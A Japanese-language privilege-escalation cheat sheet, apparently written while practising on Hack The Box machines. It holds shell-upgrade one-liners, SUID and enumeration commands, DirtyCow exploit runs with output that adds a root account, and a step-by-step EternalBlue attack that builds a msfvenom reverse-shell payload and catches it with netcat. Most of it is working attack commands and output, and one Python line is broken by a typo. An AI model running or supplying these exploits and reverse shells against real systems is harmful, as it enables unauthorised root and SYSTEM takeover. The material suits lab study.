<h1 id="privilege-escalation">Privilege Escalation</h1>
<h2 id="linux">Linux</h2>
<h3 id="tty-shell">tty shell</h3>
<pre class="hljs"><code><div>python -c 'import pty;pty.spbaawn(&quot;/bin/sh&quot;)'
python3 -c 'import pty;pty.spawn(&quot;/bin/sh&quot;)'
python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec &quot;/bin/sh&quot;;'
perl: exec &quot;/bin/sh&quot;;
ruby: exec &quot;/bin/sh&quot;
lua: os.execute('/bin/sh')
</div></code></pre>
<p>・Ctrl+c,Ctrl+zなどを利用可能にする</p>
<pre class="hljs"><code><div>stty raw -echo; fg
&lt;Enter&gt;&lt;Enter&gt;
</div></code></pre>
<pre class="hljs"><code><div>kali@kali:stty -a(結果を下のrows columns に代入)  
victim:stty rows 16 columns 136
</div></code></pre>
<p>・clearなどを可能にする</p>
<pre class="hljs"><code><div>export TERM=xterm
export SHELL=bash
export TERM=xterm-256color
stty rows &lt;num&gt; columns &lt;cols&gt;
</div></code></pre>
<h3 id="enum%E3%83%84%E3%83%BC%E3%83%AB">enumツール</h3>
<p>linpease.sh<br>
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite<br>
LinEnum.sh<br>
https://github.com/rebootuser/LinEnum</p>
<h3 id="%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%A6%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%82%A4%E3%83%88%E3%82%92%E7%94%A8%E3%81%84%E3%81%A6%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC">カーネルバージョンを確認して、カーネルエクスプロイトを用いて権限昇格</h3>
<pre class="hljs"><code><div>uname -a
</div></code></pre>
<h3 id="sudo%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E6%82%AA%E7%94%A8%E3%81%97%E3%81%A6%E6%A8%A9%E9%99%90%E6%98%87%E6%A0%BC">sudoコマンド悪用して権限昇格</h3>
<pre class="hljs"><code><div>sudo -l
</div></code></pre>
<h3 id="linux%E3%81%A7%E9%96%8B%E3%81%84%E3%81%A6%E3%81%84%E3%82%8B%E3%81%99%E3%81%B9%E3%81%A6%E3%81%AE%E3%83%9D%E3%83%BC%E3%83%88%E3%82%92%E8%A1%A8%E7%A4%BA%E3%81%99%E3%82%8B%E6%96%B9%E6%B3%95">Linuxで開いているすべてのポートを表示する方法</h3>
<pre class="hljs"><code><div>netstat -tulpn
netstat -an(linux以外)
</div></code></pre>
<h3 id="%E5%AE%9F%E8%A1%8C%E4%B8%AD%E3%81%AE%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%82%92%E7%A2%BA%E8%AA%8D">実行中のプロセスを確認</h3>
<pre class="hljs"><code><div>ps -aux
</div></code></pre>
<h3 id="pspy">pspy</h3>
<p>実行しているプロセスをダンプ。<br>
https://github.com/DominicBreuker/pspy</p>
<h3 id="%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E6%A4%9C%E7%B4%A2">ファイルの検索</h3>
<pre class="hljs"><code><div>find / -name &lt;ファイル名&gt; -type f 2&gt;&gt;/dev/null
</div></code></pre>
<ul>
<li>/...ファイルシステム全体を検索</li>
<li>-name...名前の指定</li>
<li>-type f...ディレクトリではなく、ファイル検索を指定</li>
<li>2&gt;&gt;/dev/null...全てのエラーを破棄</li>
</ul>
<h3 id="suid">SUID</h3>
<p>Linuxでは、SUIDビットが有効になっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。
まずはSUIDファイルを見つける。
下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。</p>
<pre class="hljs"><code><div>find / -perm -u=s -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
</div></code></pre>
<ul>
<li>/は、ファイルシステムの先頭（ルート）から開始し、すべてのディレクトリを検索</li>
<li>-permは、後続の権限の検索</li>
<li>-u=sは、rootユーザーが所有するファイルを検索</li>
<li>-typeは、探しているファイルの種類を示します</li>
<li>fは、ディレクトリや特殊ファイルではなく、通常のファイルを示す</li>
<li>2はプロセスの2番目のファイル記述子であるstderr（標準エラー）を示す</li>
<li>&gt;はリダイレクトを意味する</li>
<li>/dev/nullは、書き込まれたすべてのものを破棄する特別なファイルシステムオブジェクト</li>
</ul>
<p>列挙後、権限昇格に使えそうなものをGTFOで調べる<br>
https://gtfobins.github.io/</p>
<h3 id="chmod777%E3%81%AB%E8%A8%AD%E5%AE%9A%E3%81%97%E3%81%9Ffiledir%E3%82%92%E6%A4%9C%E7%B4%A2">chmod777に設定したfile/dirを検索</h3>
<pre class="hljs"><code><div>find / -type f -perm 777
</div></code></pre>
<h3 id="kernel-exploit">kernel exploit</h3>
<h4 id="dirtycow">dirtycow</h4>
<p>・40839.c(dirty.c)
パスワードを自身で入力して、firefaltというアカウントを作成する</p>
<pre class="hljs"><code><div>gcc -pthread dirty.c -o dirty -lcrypt
chmod 755 dirty
</div></code></pre>
<pre class="hljs"><code><div>./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: pass

Complete line:
firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash

mmap: b778e000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'pass'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'pass'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
</div></code></pre>
<p>・40616.c(cowroot.c)
実行するだけでrootになれる</p>
<pre class="hljs"><code><div>gcc cowroot.c -o cowroot -pthread
</div></code></pre>
<pre class="hljs"><code><div>* $ ./cowroot
* DirtyCow root privilege escalation
* Backing up /usr/bin/passwd.. to /tmp/bak
* Size of binary: 57048
* Racing, this may take a while..
* /usr/bin/passwd is overwritten
* Popping root shell.
* Don't forget to restore /tmp/bak
* thread stopped
* thread stopped
* root@box:/root/cow# id
* uid=0(root) gid=1000(foo) groups=1000(foo)
</div></code></pre>
<h2 id="windows">Windows</h2>
<h3 id="metasploitlocalexploitsuggester">metasploit(local_exploit_suggester)</h3>
<p>expploitをせずに脆弱性をチェックするために使用するモジュール。
meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。</p>
<pre class="hljs"><code><div>use post/multi/recon/local_exploit_suggester
</div></code></pre>
<h2 id="windows">windows</h2>
<h3 id="windows-exploit-suggester">windows-exploit-suggester</h3>
<p>windowsでexploitを列挙するためのスクリプト
systeminfoコマンドの出力が必要</p>
<pre class="hljs"><code><div>./windows-exploit-suggester.py --update
pip install xlrd
</div></code></pre>
<pre class="hljs"><code><div>systeminfo &gt; systeminfo.txt
./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
</div></code></pre>
<h3 id="evlilwinrm">evlilwinrm</h3>
<p>WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。<br>
5985ポートが空いている時に使用。</p>
<h4 id="%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB">インストール</h4>
<pre class="hljs"><code><div>gem install evil-winrm
</div></code></pre>
<h4 id="%E4%BD%BF%E3%81%84%E6%96%B9">使い方</h4>
<pre class="hljs"><code><div>evil-winrm -u &lt;username&gt; -p &lt;password&gt; -i &lt;remote host ip&gt;
</div></code></pre>
<h3 id="ms17-010eternalblue">MS17-010(EternalBlue)</h3>
<p>エクスプロイトに必要なものを準備
この最後のmysmb.pyをダウンロードしておかないと、ImportError：mysmbと警告が出る。</p>
<pre class="hljs"><code><div>wget https://www.exploit-db.com/raw/42315
mv 42315 eternalblue.py
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
</div></code></pre>
<p>次にimpacketもインストールしておかないと使うことができないので入っていない場合は落としておく。</p>
<pre class="hljs"><code><div>git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip install .
</div></code></pre>
<p>もしもここでpipが入っていないと警告が出た場合は、</p>
<pre class="hljs"><code><div>sudo apt install python-pip
</div></code></pre>
<p>をして、pipもインストール。</p>
<p>次にリバースシェルに使うペイロードをmsfvenomを利用して作成</p>
<pre class="hljs"><code><div>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.11 LPORT=1234 -f exe &gt; reverse.exe
</div></code></pre>
<p>次にeternalblue.pyのソースコードを変更してエクスプロイトに使用できるようにする。
まずUSERNAMEのところを下記の画像のように変更。</p>
<p><img src="./image/2021-05-06-17-48-11.png" alt=""></p>
<p>次にsmb_pwn関数内のスクリプトを下記の画像のように変更。</p>
<p><img src="./image/2021-05-06-17-48-54.png" alt=""></p>
<p>これで準備は完了
通信を受けるためにnetcatで待ち受けておく。</p>
<pre class="hljs"><code><div>nc -lvp 1234
</div></code></pre>
<p>最後にeternalblue.pyを実行</p>
<pre class="hljs"><code><div>┌─[✗]─[yukitsukai@parrot]─[~/htb/Blue]
└──╼ $python eternalblue.py 10.10.10.40 ntsvcs
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001af9560
SESSION: 0xfffff8a001bf5de0
.
.
.
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
</div></code></pre>
<p>すると、通信を待ち受けていたnetcatの方でシェルが取得できる。</p>
<p><img src="./image/2021-05-06-17-49-20.png" alt=""></p>

</body>
</html>
